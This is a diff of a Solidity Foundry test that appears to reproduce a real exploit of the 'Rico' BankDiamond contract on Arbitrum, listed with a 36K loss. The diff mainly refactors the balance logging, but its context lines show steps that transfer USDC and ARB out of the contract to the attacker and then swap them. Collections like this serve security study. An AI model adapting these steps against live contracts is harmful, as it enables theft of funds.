@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "forge-std/Test.sol";
+import "../basetest.sol";
 import "../interface.sol";
 
 // @KeyInfo - Total Lost : 36K
@@ -22,7 +22,7 @@ interface IBankDiamond {
     function flash(address, bytes calldata) external returns (bytes memory result);
 }
 
-contract Rico is Test {
+contract Rico is BaseTestWithBalanceLog {
     uint256 blocknumToForkFrom = 202_973_712;
 
     address constant BankDiamond = 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b;
@@ -37,13 +37,10 @@ contract Rico is Test {
 
     function setUp() public {
         vm.createSelectFork("arbitrum", blocknumToForkFrom);
+        fundingToken = USDC_TOKEN;
     }
 
-    function testExploit() public {
-        emit log_named_decimal_uint(
-            "Attacker USDC Balance Before exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
-        );
-
+    function testExploit() public balanceLog {
         // Transfer tokens from BankDiamond to the attacker
         transferTokens(USDC_TOKEN);
         transferTokens(ARB_TOKEN);
@@ -63,11 +60,6 @@ contract Rico is Test {
         swapTokens(WSTETH_TOKEN);
         swapTokens(WETH_TOKEN);
         swapTokens(ARB_USDC_TOEKN);
-
-        // Log balances after exploit
-        emit log_named_decimal_uint(
-            "Attacker USDC Balance After exploit", IERC20(USDC_TOKEN).balanceOf(address(this)), 6
-        );
     }
 
     function _getTransferData(address token) internal view returns (bytes memory data) {
